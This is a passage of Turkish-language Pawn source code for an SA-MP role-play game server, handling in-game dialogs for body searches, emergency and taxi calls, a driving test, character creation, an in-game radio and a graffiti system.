			    return 1;
			}
			Isyeri[yakindaki][icikisvw] = sahip;
			IsyeriKaydet(yakindaki);
			format(string, sizeof(string), "Ýþyeri bilgileri ve log dosyasý kaydedildi! Yeni iþyeri cikisVW: %d olarak deðiþtirildi.", sahip);
			Bilgi(playerid, string);
		}
		ShowIDuzenle(playerid, yakindaki);
		return 1;
	}
	if(dialogid == 162)
	{
	    if(!response)
	    {
			Hata(playerid, "Üstünüzü aramasýna izin vermediniz.");
			UstunuAra[playerid] = -1;
			return 1;
	    }
	    new giveplayerid = UstunuAra[playerid];
	    new string[128];
     	format(string, sizeof(string), "{47B312}%s isimli oyuncunun üzerini arýyorsunuz:", OyuncuAdiniBul(playerid));
		SendClientMessage(giveplayerid, -1, string);
		format(string, sizeof(string), "Nakit: %d$", GetPlayerCash(playerid));
		SendClientMessage(giveplayerid, COLOR_WHITE, string);
		if(Karakter[playerid][telno] != 0)
		{
		    SendClientMessage(giveplayerid, COLOR_WHITE, "Cep telefonu var.");
		}
		if(Karakter[playerid][maske] == 1)
		{
			SendClientMessage(giveplayerid, COLOR_WHITE, "Maske var.");
		}
		if(Karakter[playerid][telsiz] != 0)
		{
			SendClientMessage(giveplayerid, COLOR_WHITE, "Telsiz var.");
		}
		SendClientMessageEx(giveplayerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Esrar: ["C2"%d"C1"] Amfetamin: ["C2"%d"C1"] Metamfetamin: ["C2"%d"C1"]", Karakter[playerid][uesrar], Karakter[playerid][amfetamin], Karakter[playerid][metamfetamin]);
		SendClientMessageEx(giveplayerid,-1, ""C2"[UYUÞTURUCULAR] "C1"LSD: ["C2"%d"C1"] Extacy: ["C2"%d"C1"] Kokain: ["C2"%d"C1"]", Karakter[playerid][lsd], Karakter[playerid][extacy], Karakter[playerid][kokain]);
		SendClientMessageEx(giveplayerid,-1, ""C2"[UYUÞTURUCULAR] "C1"Eroin: ["C2"%d"C1"] Morfin: ["C2"%d"C1"] MDA: ["C2"%d"C1"]",Karakter[playerid][eroin], Karakter[playerid][morfin], Karakter[playerid][MDA]);
		ShowGuns(giveplayerid, playerid);
		format(string, sizeof(string), "%s'nin üzerinde ellerini gezdirir ve üstünü arar.", OyuncuAdiniBul(playerid));
		MeGonder(giveplayerid, 30.0, string);
		UstunuAra[playerid] = 0;
		return 1;
	}
	if(dialogid == 506)
	{
	    if(response)
	    {
	        new davet = GetPVarInt(playerid, "DavetEden");
	        Karakter[playerid][birlik] = Karakter[davet][birlik];
	        switch(Birlik[Karakter[playerid][birlik]][seviye])
			{
				case 1: Karakter[playerid][rutbe] = 12;
				case 2: Karakter[playerid][rutbe] = 15;
				case 3: Karakter[playerid][rutbe] = 17;
				case 4..5: Karakter[playerid][rutbe] = 20;
			}
	        Bilgi(playerid, "Oluþuma girdiniz.");
	        Bilgi(davet, "Davet ettiðiniz kiþi daveti kabul etti.");
	        new mstring[128];
	        format(mstring, sizeof(mstring), "%s isimli oyuncu birliðe dahil edildi.",OyuncuAdiniBul(playerid));
	        if(Birlik[Karakter[davet][birlik]][ftip] == LSPD) LSPDGonder(mstring);
	        else BirlikGonder(playerid,mstring);
		}
		return 1;
	}
	if(dialogid == 507)
	{
	    if(response)
	    {
		    if(isnull(inputtext)) return 1;
	        new string[256], sayi;
	        for(new i; i < MAX_PLAYERS; i++)
	        {
				if(tisbasi[i] == 1)
				{
					format(string, sizeof(string), "[ÇAÐRI]{FFFFFF} %s taksi çaðýrýyor. Adres: %s", OyuncuAdiniBul(playerid), inputtext);
					SendClientMessage(i, COLOR_ORANGE, string);
				    sayi++;
				}
			}
			if(!sayi) Hata(playerid, "Þu an aktif bir taksici bulunmamaktadýr.");
			else Bilgi(playerid, "Çaðrýnýz aktif olan taksicilere iletildi.");
		}
	    return 1;
	}
	if(dialogid == 508)
	{
	    if(response)
	    {
			if(listitem == 0) ShowPlayerDialog(playerid, 509, DIALOG_STYLE_INPUT, "Acil Servis", "Acil durumunuzu ve konumunuzu kýsa ve öz biçimde yazýnýz.", "Tamam", "Vazgeç");
			if(listitem == 1) ShowPlayerDialog(playerid, 510, DIALOG_STYLE_INPUT, "Acil Servis", "Acil durumunuzu ve konumunuzu kýsa ve öz biçimde yazýnýz.", "Tamam", "Vazgeç");
		}
		return 1;
	}
	if(dialogid == 509 || dialogid == 510)
	{
	    if(response)
	    {
		    if(isnull(inputtext)) return 1;
	        new string[256];
			if(dialogid == 509)
			{
			    new _id;
				for(new x=0;x<MAX_IHBAR;x++)
				{
				    if(Ihbar[x][ihbarveren] == 0 && Ihbar[x][ihbarno] == 0)
				    {
				        _id = x;
						break;
				    }
				}
				Ihbar[_id][ihbarveren] = Karakter[playerid][sqlid];
      			Ihbar[_id][ihbarno] = Karakter[playerid][telno];
				format(Ihbar[_id][ihbartext], 256, "%s", inputtext);
				new hour,minuite,second;
				gettime(hour,minuite,second);
				#pragma unused second
				format(Ihbar[_id][ihbartarih], 256, "Saat: %d:%d", hour,minuite);
				foreach(new i : Player)
				{
                	if(Birlik[Karakter[i][birlik]][ftip] == LSPD && Karakter[i][isbasi] == 1)
                	{
                	    new BolgeBulucu[MAX_ZONE_NAME];
						if(GetPlayerInterior(playerid) == 0 && GetPlayerVirtualWorld(playerid) == 0) GetPlayerZone(playerid, BolgeBulucu, MAX_ZONE_NAME);
						else BolgeBulucu = "Bilinmiyor";
						format(string, sizeof(string), "[911] %d: %s",Ihbar[_id][ihbarno],Ihbar[_id][ihbartext]);
						SendClientMessage(i, 0x4bd9f3FF, string);
						format(string, sizeof(string), "[911] Gönderen: %s / Konum: %s / %s",SQLFromName(Ihbar[_id][ihbarveren]),BolgeBulucu,Ihbar[_id][ihbartarih]);
						SendClientMessage(i, 0x4bd9f3FF, string);
					}
				}
			}
			else if(dialogid == 510)
			{
			    foreach(new i : Player)
				{
                	if((Birlik[Karakter[i][birlik]][ftip] == ASMS && Karakter[i][medisbasi] == 1) || (Birlik[Karakter[i][birlik]][ftip] == LSFD && Karakter[i][fdisbasi] == 1))
                	{
						format(string, sizeof(string), "[ÇAÐRI]{FFFFFF} %s(%d) çaðrýda bulundu. Çaðrý: %s", OyuncuAdiniBul(playerid), Karakter[playerid][telno], inputtext);
						SendClientMessage(i, COLOR_ORANGE, string);
					}
				}
			}
			Bilgi(playerid, "Çaðrýnýz acil servise iletildi.");
		}
		return 1;
	}
	if(dialogid == 512)
	{
		if(response)
		{
		    if(listitem == 0)
		    {
			   	new Float:X,Float:Y,Float:Z;
				GetPlayerPos(playerid,X,Y,Z);
				Karakter[playerid][posx] = X;
				Karakter[playerid][posy] = Y;
				Karakter[playerid][posz] = Z;
				Karakter[playerid][interior] = GetPlayerInterior(playerid);
				Karakter[playerid][vworld] = GetPlayerVirtualWorld(playerid);
	        	new string[128];
		        for(new x;x<5;x++)
		        {
		            if(MySQLCheckAksesuar(Karakter[playerid][sqlid],x) != 0) format(string, sizeof(string), "%s%d (DOLU)\n", string, x);
		            else format(string, sizeof(string), "%s%d\n", string, x);
		        }
	        	ShowPlayerDialog(playerid, 146, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Aksesuar Sistemi", string, "Seç", "Ýptal");
		    }
		    if(listitem == 1)
		    {
				if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, erkekkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, erkekkiyafetsiyah, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kadinkiyafetbeyaz, "Kiyafet Secimi");
				if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kadinkiyafetsiyah, "Kiyafet Secimi");
		    }
		}
		return 1;
	}
	if(dialogid == 500)
	{
	    if(response)
	    {
	        if(Karakter[playerid][ehliyet] == 0)
	        {
	            if(GetPlayerCash(playerid) >= 150)
	            {
	            	Bilgi(playerid, "Ehliyet testine girdiniz, araçlardan birine bininiz.");
	            	Ipucu(playerid, "Araca bindiðinizde aracýn motoru açýlacaktýr.");
	            	GivePlayerCash(playerid, -150);
					ehliyettesti[playerid] = 1;
				}
				else
				{
				    Hata(playerid, "Ehliyet alma ücreti 150$'dýr.");
				    return 1;
				}
	        }
	        else
	        {
	            Hata(playerid, "Zaten ehliyetiniz bulunmaktadýr.");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(dialogid == 503)
	{
	    if(response)
	    {
        	CancelDrivingTest(playerid);
	    	Hata(playerid, "Çýktýðýn için testten baþarýlý olamadýn.");
	    }
	    else
		{
		    PutPlayerInVehicle(playerid, ehliyetaraci[playerid], 0);
		}
	    return 1;
	}
 	if(dialogid == 163)
	{
	    if(response)
	    {
	        Karakter[playerid][uyruk] = 1;
		    Bilgi(playerid, "Karakterinizin ten rengi siyah olarak belirlendi.");
	    }
	    else
	    {
	        Karakter[playerid][uyruk] = 2;
		    Bilgi(playerid, "Karakterinizin ten rengi beyaz olarak belirlendi.");
	    }
	    if(Karakter[playerid][skin] <= 0) {
            Karakter[playerid][posx] = 182.6387,Karakter[playerid][posy] = -88.6457,Karakter[playerid][posz] = 1002.0234;
			SetPlayerPos(playerid, Karakter[playerid][posx], Karakter[playerid][posy], Karakter[playerid][posz]);
			SetPlayerFacingAngle(playerid, 91.8941);
   			SetPlayerInterior(playerid, 18);
   			SetPlayerVirtualWorld(playerid, playerid+1);
   			SetPlayerCameraPos(playerid,179.4780,-88.2440,1002.0234);
			SetPlayerCameraLookAt(playerid,182.4245,-88.1048,1002.0234);
			TogglePlayerControllable(playerid, 0);
   			if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, egirisbeyaz, "Kiyafet Secimi");
			if(Karakter[playerid][cinsiyet] == 1 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, egirissiyah, "Kiyafet Secimi");
			if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 2) ShowModelSelectionMenu(playerid, kgirisbeyaz, "Kiyafet Secimi");
			if(Karakter[playerid][cinsiyet] == 2 && Karakter[playerid][uyruk] == 1) ShowModelSelectionMenu(playerid, kgirissiyah, "Kiyafet Secimi");
		}
		else {
        	if(!Karakter[playerid][yas])
			{
			    ShowPlayerDialog(playerid, 164, DIALOG_STYLE_INPUT, "Yaþ Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen yaþýnýzý girin. ", "Seçim", "");
			}
			else if(!DilKontrolEx(playerid))
			{
			    ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
			}
			else if(!Karakter[playerid][boy])
			{
			    ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
			}
			else if(!Karakter[playerid][kilo])
			{
			    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
			}
			else if(!Karakter[playerid][gozrenk])
			{
			    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
			}
			else if(!Karakter[playerid][sacrenk])
			{
			    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
			}
		}
	    return 1;
	}
	if(dialogid == 164)
	{
	    if(response)
		{
			if(16 <= strval(inputtext) <= 70)
			{
			    Karakter[playerid][yas] = strval(inputtext);
			    new string[128];
			    format(string, sizeof(string), "Karakter yaþýnýz %d olarak belirlendi.", strval(inputtext));
			    Bilgi(playerid, string);
			}
			if(!DilKontrolEx(playerid))
			{
			    ShowPlayerDialog(playerid, 299, DIALOG_STYLE_LIST, "Ana Dil Seçimi(Tekrar Seçemezsiniz.)", "Almanca\nArapça\nÇince\nFransýzca\nÝspanyolca\nÝtalyanca\nJaponca\nRusça\nÝbranice\nYunanca\nErmenice\nSlovakça\nÝrlandaca\nPortekizce\nSýrpça\nArnavutça\nÝngilizce", "Seçim", "");
			}
			else if(!Karakter[playerid][boy])
			{
			    ShowPlayerDialog(playerid, 445, DIALOG_STYLE_LIST, "Boy Seçimi", "1.50-1.60m\n1.61-1.70m\n1.71-1.76m\n1.77-1.85m\n+1.85m", "Seçim", "");
			}
			else if(!Karakter[playerid][kilo])
			{
			    ShowPlayerDialog(playerid, 446, DIALOG_STYLE_LIST, "Kilo Seçimi", "40-50kg\n51-60kg\n61-65kg\n66-75kg\n76-85kg\n86-90kg\n91-100kg\n101-120kg\n+120kg", "Seçim", "");
			}
			else if(!Karakter[playerid][gozrenk])
			{
			    ShowPlayerDialog(playerid, 447, DIALOG_STYLE_LIST, "Göz Rengi Seçimi", "Siyah\nKahverengi\nMavi\nYeþil\nDiðer", "Seçim", "");
			}
			else if(!Karakter[playerid][sacrenk])
			{
			    ShowPlayerDialog(playerid, 448, DIALOG_STYLE_LIST, "Saç Rengi Seçimi", "Kel\nSiyah\nKahverengi\nKumral\nSarý\nKýzýl\nDiðer", "Seçim", "");
			}
		}
	    else ShowPlayerDialog(playerid, 164, DIALOG_STYLE_INPUT, "Yaþ Seçimi", "[!]DÝKKAT Yaptýðýnýz seçimin geri dönüþü olmayacaktýr.\n\nLütfen yaþýnýzý girin. ", "Seçim", "");
	}
	if(dialogid == 165)
	{
	    if(!isnull(inputtext))
		{
			new string[128];
			format(string, 128, "%s adlý oluþumun adý %s olarak deðiþtirildi.", Birlik[Karakter[playerid][birlik]][fisim], inputtext);
		    strmid(Birlik[Karakter[playerid][birlik]][fisim], inputtext, 0, strlen(inputtext), 32);
		    Bilgi(playerid, string);
		    BirlikKaydet(Karakter[playerid][birlik]);
		}
	}
	if(dialogid == 166)
	{
	    if(!isnull(inputtext) && IsNumeric(inputtext))
		{
			new string[128];
			format(string, 128, "%s adlý oluþumun tipi %d olarak deðiþtirildi.", Birlik[Karakter[playerid][birlik]][fisim], strval(inputtext));
			Birlik[Karakter[playerid][birlik]][ftip] = strval(inputtext);
   			Bilgi(playerid, string);
            BirlikKaydet(Karakter[playerid][birlik]);
		}
	}
 	if(dialogid == 401)
    {
        if(response)
        {
			if(listitem == 0)
			{
			    ShowPlayerDialog(playerid, 403, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Radyo", "Müzik urlsini girin.", "Tamam", "Ýptal");
			}
			else if(listitem == 1)
			{
				ShowPlayerDialog(playerid, 402, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Radyo", "Müzik urlsini girin.", "Tamam", "Ýptal");
			}
		}
        return 1;
    }
    if(dialogid == 402)
    {
		if(response)
		{
			new radyologlari[190];
			format(radyologlari,sizeof(radyologlari),"RADYO LOGLARI | Oyuncu bilgileri: %s[%d] URL: %s",OyuncuAdiniBul(playerid),Karakter[playerid][sqlid],inputtext);
			printf(radyologlari);
			RadyoVirtual[playerid] = GetPlayerVirtualWorld(playerid);
		    rennieRadyo[playerid] = 1;
			Bilgi(playerid,"Radyo açtýnýz.");
		    GetPlayerPos(playerid, rennieradyopos[playerid][0], rennieradyopos[playerid][1], rennieradyopos[playerid][2]); rennieradyopos[playerid][2] = rennieradyopos[playerid][2] - 1;
		    GetPlayerFacingAngle(playerid, rennieradyopos[playerid][3]); rennieradyopos[playerid][3] = rennieradyopos[playerid][3] +180;
		    rennieRadyoObject[playerid] = CreateDynamicObject(2103, rennieradyopos[playerid][0], rennieradyopos[playerid][1], rennieradyopos[playerid][2], 0, 0, rennieradyopos[playerid][3], GetPlayerVirtualWorld(playerid), GetPlayerInterior(playerid));
			ObjeKurdu(playerid);
			new url[128],link[256],requestlink[512];
			format(url, sizeof(url), "%s", inputtext);
			if(strfind(url,"&") != -1) strmid(url,url,0,strfind(url,"&"), 128);
			format(link,256,"%s",url);
			format(requestlink,sizeof(requestlink),"michaelbelgium.me/ytconverter/convert.php?youtubelink=%s",link);
			HTTP(playerid, HTTP_GET, requestlink, "", "OnVpsResponse");
			new string[128];
	        format(string, sizeof(string), "{7EFB1A}%s",OyuncuAdiniBul(playerid));
			rennieRadyoLabel[playerid] = CreateDynamic3DTextLabel(string,-1,rennieradyopos[playerid][0], rennieradyopos[playerid][1], rennieradyopos[playerid][2], 13, .worldid=GetPlayerVirtualWorld(playerid),.interiorid=GetPlayerInterior(playerid));
            Streamer_Update(playerid);
            Bilgi(playerid, "Youtube videosunun mp3'e çevirilmesini biraz bekleyin.");
		}
		return 1;
    }
	if(dialogid == 403)
	{
	    if(response)
	    {
			new radyologlari[190];
			format(radyologlari,sizeof(radyologlari),"RADYO LOGLARI | Oyuncu bilgileri: %s[%d] URL: %s",OyuncuAdiniBul(playerid),Karakter[playerid][sqlid],inputtext);
			printf(radyologlari);
			RadyoVirtual[playerid] = GetPlayerVirtualWorld(playerid);
		    rennieRadyo[playerid] = 1;
			Bilgi(playerid,"Radyo açtýnýz.");
		    GetPlayerPos(playerid, rennieradyopos[playerid][0], rennieradyopos[playerid][1], rennieradyopos[playerid][2]); rennieradyopos[playerid][2] = rennieradyopos[playerid][2] - 1;
		    GetPlayerFacingAngle(playerid, rennieradyopos[playerid][3]); rennieradyopos[playerid][3] = rennieradyopos[playerid][3] +180;
		    rennieRadyoObject[playerid] = CreateDynamicObject(2103, rennieradyopos[playerid][0], rennieradyopos[playerid][1], rennieradyopos[playerid][2], 0, 0, rennieradyopos[playerid][3]);
			ObjeKurdu(playerid);
			format(rennieRadyoURL[playerid],256, "%s", inputtext);
			new string[128];
	        format(string, sizeof(string), "{7EFB1A}%s",OyuncuAdiniBul(playerid));
			rennieRadyoLabel[playerid] = CreateDynamic3DTextLabel(string,-1,rennieradyopos[playerid][0], rennieradyopos[playerid][1], rennieradyopos[playerid][2], 13, .worldid=GetPlayerVirtualWorld(playerid),.interiorid=GetPlayerInterior(playerid));
            Streamer_Update(playerid);
		}
	    return 1;
	}
    if(dialogid == 167)
    {
        if(response)
        {
            new string[128];
            format(string, sizeof(string), "DELETE FROM `aksesuarlar` WHERE `id` = '%d'", Karakter[playerid][sqlid]);
            mysql_tquery(1, string);
            Bilgi(playerid, "Tüm aksesuarlarýnýz baþarýyla silindi.");
            RemovePlayerAttachedObject(playerid, 0);
            RemovePlayerAttachedObject(playerid, 1);
            RemovePlayerAttachedObject(playerid, 2);
            RemovePlayerAttachedObject(playerid, 3);
            RemovePlayerAttachedObject(playerid, 4);
			for(new x=0;x<5;x++)
			{
				aksesuar[playerid][x][abone] = 0;
				aksesuar[playerid][x][amodel] = 0;
				aksesuar[playerid][x][akX] = 0.0;
				aksesuar[playerid][x][akY] = 0.0;
				aksesuar[playerid][x][akZ] = 0.0;
				aksesuar[playerid][x][arX] = 0.0;
				aksesuar[playerid][x][arY] = 0.0;
				aksesuar[playerid][x][arZ] = 0.0;
				aksesuar[playerid][x][aoX] = 0.0;
				aksesuar[playerid][x][aoY] = 0.0;
				aksesuar[playerid][x][aoZ] = 0.0;
				aksesuar[playerid][x][arenk1] = 0;
				aksesuar[playerid][x][arenk2] = 0;
				aksesuar[playerid][x][giyilmis] = false;
			}
        }
		return 1;
    }
    if(dialogid == 168)
    {
        if(response)
        {
            if(Karakter[playerid][para] >= 1000)
			{
				GivePlayerCash(playerid, -1000);
		        Karakter[playerid][meslek] = 3;
		        Bilgi(playerid, "Tezgahtarlýk mesleðine katýldýnýz. {B3B3B3}''/tezgah''");
		        KarakterKaydet(playerid);
			}
			else Hata(playerid, "Yanýnýzda yeterli miktarda nakit bulunmamaktadýr.");
		}
        return 1;
    }
	if(dialogid == 169)
	{
	    if(response)
	    {
	        new satan = GetPVarInt(playerid, "SosisliSatan");
	        new fiyat = GetPVarInt(playerid, "SosisliFiyat");
	        if(!Girdi[satan]) return Hata(playerid, "Teklif aldýðýnýz oyuncu oyundan çýkmýþ.");
	        if(Karakter[playerid][para] >= fiyat)
	        {
	            new string[128];
	            format(string, 128, "/me elindeki sosisliyi %s doðru uzatýr.", OyuncuAdiniBul(playerid));
	            OnPlayerCommandPerformed(satan, string,0);
				GivePlayerCash(playerid, -fiyat);
				GivePlayerCash(satan, fiyat);
				if(GetPlayerCan(playerid) < 85) SetPlayerHealth(playerid, GetPlayerCan(playerid)+15);
				if(GetPlayerCan(playerid) >= 85) SetPlayerHealth(playerid, 100.0);
	        }
	    }
	    return 1;
	}
	if(dialogid == 171)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    new string[128];
	    if(response)
	    {
	        Karakter[giveplayerid][uesrar] = strval(inputtext);
	        format(string, sizeof(string), "%s adlý oyuncuya %d miktar esrar verdiniz.", OyuncuAdiniBul(giveplayerid));
	        Bilgi(playerid, string);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 172)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    new string[128];
	    if(response)
	    {
	        Karakter[giveplayerid][usaksi] = strval(inputtext);
	        format(string, sizeof(string), "%s adlý oyuncuya %d miktar saksý verdiniz.", OyuncuAdiniBul(giveplayerid));
	        Bilgi(playerid, string);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 173)
	{
	    new giveplayerid = KDuzenleVar[playerid];
	    new string[128];
	    if(response)
	    {
	        Karakter[giveplayerid][esrartohum] = strval(inputtext);
	        format(string, sizeof(string), "%s adlý oyuncuya %d miktar esrar tohumu verdiniz.", OyuncuAdiniBul(giveplayerid));
	        Bilgi(playerid, string);
	    }
	    ShowKDuzenle(playerid, KDuzenleVar[playerid]);
	}
	if(dialogid == 174)
	{
	    if(response)
	    {
	        if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT && GetPlayerState(selamlas[playerid]) == PLAYER_STATE_ONFOOT)
	        {
	            switch(selamturu[playerid])
	            {
			        case 1:
					{
					    ApplyAnimationEx(playerid,"GANGS","hndshkba",4.1,0,1,1,1,1);
					    ApplyAnimationEx(selamlas[playerid],"GANGS","hndshkba",4.1,0,1,1,1,1);
					    selamlas[selamlas[playerid]] = 0;
					    selamlas[playerid] = 0;
					    selamturu[playerid] = 0;
				   		return 1;
					}
					case 2:
					{
					    ApplyAnimationEx(playerid,"GANGS","hndshkcb",4.1,0,1,1,1,1);
					    ApplyAnimationEx(selamlas[playerid],"GANGS","hndshkcb",4.1,0,1,1,1,1);
					    selamlas[selamlas[playerid]] = 0;
					    selamlas[playerid] = 0;
					    selamturu[playerid] = 0;
				   		return 1;
					}
					case 3:
					{
				        ApplyAnimationEx(playerid,"GANGS","hndshkda",4.1,0,1,1,1,1);
				        ApplyAnimationEx(selamlas[playerid],"GANGS","hndshkda",4.1,0,1,1,1,1);
					    selamlas[selamlas[playerid]] = 0;
					    selamlas[playerid] = 0;
					    selamturu[playerid] = 0;
				   		return 1;
					}
					case 4:
					{
				        ApplyAnimationEx(playerid,"GANGS","hndshkea",4.1,0,1,1,1,1);
				        ApplyAnimationEx(selamlas[playerid],"GANGS","hndshkea",4.1,0,1,1,1,1);
					    selamlas[selamlas[playerid]] = 0;
					    selamlas[playerid] = 0;
					    selamturu[playerid] = 0;
				   		return 1;
					}
					case 5:
					{
				        ApplyAnimationEx(playerid,"GANGS","hndshkfa_swt",4.1,0,1,1,1,1);
				        ApplyAnimationEx(selamlas[playerid],"GANGS","hndshkfa_swt",4.1,0,1,1,1,1);
					    selamlas[selamlas[playerid]] = 0;
					    selamlas[playerid] = 0;
				   		return 1;
					}
				}
			}
			else
			{
			    Hata(playerid,"Araçtayken animasyon kullanamazsýnýz.");
			    Hata(selamlas[playerid],"Kiþi araçta olduðu için selamlaþamadýnýz.");
			    selamlas[selamlas[playerid]] = 0;
			    selamlas[playerid] = 0;
			    selamturu[playerid] = 0;
			    return 1;
			}
		}
		else // Hoþt ulan amýnakodumun
		{
		    Hata(playerid,"Selamlaþma isteðini reddettiniz.");
		    Hata(selamlas[playerid],"Kiþi selamlaþma isteðinizi reddetti.");
		    selamlas[selamlas[playerid]] = 0;
		    selamlas[playerid] = 0;
		    selamturu[playerid] = 0;
		}
	}
	if(dialogid == 175)
	{
	    if(response)
	    {
	        switch(listitem)
	        {
			    case 0:
			    {
			        ShowPlayerDialog(playerid,176,DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Graffiti Font","(( ÖRNEK: ARIAL ))\nFont adýný giriniz:","Seç","Kapat");
			    }
			    case 1:
				{
			        ShowPlayerDialog(playerid,177,DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Graffiti Ýçeriði","Graffiti içeriðini yazýnýz:\n(( 5-10 karakter aralýðýnda ))","Ýleri","Kapat");
				}
				case 2:
				{
			        ShowPlayerDialog(playerid,178,DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Graffiti Renk","Graffiti rengini giriniz:\n(( Örnek: 0xFFFFFFFF ya da #FFFFFF ))","Seç","Kapat");
				}
				case 3: // Yazý kalýnlýðý
				{
					ShowPlayerDialog(playerid,180,DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Graffiti Kalýnlýk","0: Normal\n1: Kalýn","Seç","Kapat");
				}
				case 4: // Font boyutu
				{
				    ShowPlayerDialog(playerid, 181, DIALOG_STYLE_INPUT,""C7"EIGHTBORN - "C8"Graffiti Font boyutu","(( Orjinal boyut: 24 ))\nFont boyutunu giriniz:","Ýleri","Kapat");
				}
				case 5: // Materyal boyutu
				{
				    ShowPlayerDialog(playerid, 182, DIALOG_STYLE_LIST,""C7"EIGHTBORN - "C8"Graffiti Materyal B","32x32 (10)\n64x32 (20)\n64x64 (30)\n128x32 (40)\n128x64 (50)\n128x128 (60)\n256x32 (70)\n256x64 (80)\n256x128 (90)\n256x256 (100)\n512x64 (110)\n512x128 (120)\n512x256 (130)\n512x512 (140)","Seç","Kapat");
				}
				case 6: // Ön izleme
				{
				    ShowPlayerDialog(playerid, 183, DIALOG_STYLE_MSGBOX,""C7"EIGHTBORN - "C8"Graffiti Önizleme","Graffiti ön izlemesine baþlýyorsunuz.\nEðer 90 saniye içerisinde iþlemleri bitiremezseniz, graffiti sistem tarafýndan iptal edilir ve silinir.","Anladým","Anlamadým");
				}
				case 7: // Kaydet
				{
				    if(Karakter[playerid][gYapiyor] == 0)
				    {
						new MesajString[256];
				    	format(MesajString,sizeof(MesajString),"Graffiti: %s\nFont: %s\nGraffiti sahibi: %s\nGraffitiyi yapmak istediðinizden emin misiniz?",Karakter[playerid][gYazi],Karakter[playerid][gFont],OyuncuAdiniBul(playerid));
						ShowPlayerDialog(playerid,179,DIALOG_STYLE_MSGBOX,""C7"EIGHTBORN - "C8"Graffiti Sistemi",MesajString,"Evet","Hayýr");
					}
					else
					{
					    Hata(playerid,"Yeni bir graffiti yapmadan önce, baþladýðýnýz graffitiyi bitirmelisiniz.");
					}
				}
				case 8: // Ön izleme iptal
				{
					Karakter[playerid][gOnizleme] = 0;
					DestroyDynamicObject(gObjesi[playerid]);
					Bilgi(playerid,"Graffiti ön izlemesi iptal edildi.");
				}
				case 9: // Ön izleme düzenle
				{
				    if(IsPlayerInRangeOfPoint(playerid, 5.0,Karakter[playerid][gPos][0], Karakter[playerid][gPos][1], Karakter[playerid][gPos][2]))
				    {
						Karakter[playerid][gDuzenliyor] = 1;
						EditDynamicObject(playerid, gObjesi[playerid]);
		            }
		            else
		            {
		                Hata(playerid,"Önizlemesini düzenleyeceðiniz objeye yakýn deðilsiniz.");
		            }
				}
	        }
	    }
	}
	if(dialogid == 176)
	{
	    if(response)
	    {
	        new gstring[256];
	        format(Karakter[playerid][gFont], 80, "%s", inputtext);
	        format(gstring, sizeof(gstring), "Graffiti fontunu deðiþtirdiniz. ( %s )", Karakter[playerid][gFont]);
			Bilgi(playerid, gstring);
			ShowPlayerDialog(playerid, 175, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Graffiti Sistemi", "Font Düzenle\nYazý Düzenle\nRenk Düzenle\nYazý Durumu\nFont Boyutu\nMateryal Boyutu\nÖnizleme\nGraffitiyi kaydet\nÖnizleme Ýptal\nÖnizleme Düzenle", "Seç", "Kapat");
	    }
	}
 	if(dialogid == 177)
	{
	    if(response)
	    {
	        new MesajString[256];
			format(Karakter[playerid][gYazi],64,"%s",inputtext);
			format(MesajString,sizeof(MesajString),"Graffiti yazýsýný deðiþtirdiniz. (%s)",Karakter[playerid][gYazi]);
			Bilgi(playerid,MesajString);
			ShowPlayerDialog(playerid, 175, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Graffiti Sistemi", "Font Düzenle\nYazý Düzenle\nRenk Düzenle\nYazý Durumu\nFont Boyutu\nMateryal Boyutu\nÖnizleme\nGraffitiyi kaydet\nÖnizleme Ýptal\nÖnizleme Düzenle", "Seç", "Kapat");
			Karakter[playerid][gSure] = strlen(inputtext)*2;
			ObjesiniGuncelle(playerid);
		}
	}
	if(dialogid == 178)
	{
		if(response)
		{
		    if(strlen(inputtext) < 1 || strlen(inputtext) > 100)
		    {
